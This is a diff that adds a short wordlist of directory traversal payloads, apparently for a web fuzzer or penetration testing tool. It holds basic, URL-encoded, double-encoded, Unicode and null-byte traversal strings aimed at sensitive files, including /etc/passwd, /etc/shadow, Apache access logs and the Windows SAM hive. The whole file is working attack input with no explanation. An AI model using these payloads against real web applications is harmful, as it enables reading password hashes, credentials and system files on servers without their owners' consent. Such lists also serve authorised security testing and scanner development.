@@ -1,0 +1,41 @@
+# Directory Traversal Payloads
+# Basic traversal
+../
+..\/
+..\\
+....//
+....\\
+
+# Unix/Linux payloads
+../../../etc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../proc/version
+../../../var/log/apache/access.log
+../../../var/log/apache2/access.log
+
+# Windows payloads
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\win.ini
+..\..\..\boot.ini
+..\..\..\windows\system32\config\sam
+
+# Encoded payloads
+%2e%2e%2f
+%2e%2e%5c
+%2e%2e%2f%2e%2e%2f%2e%2e%2f
+..%252f
+..%c0%af
+..%c1%9c
+
+# Double encoding
+%252e%252e%252f
+%252e%252e%255c
+
+# Unicode encoding
+..%u2215
+..%u2216
+
+# Null byte injection
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
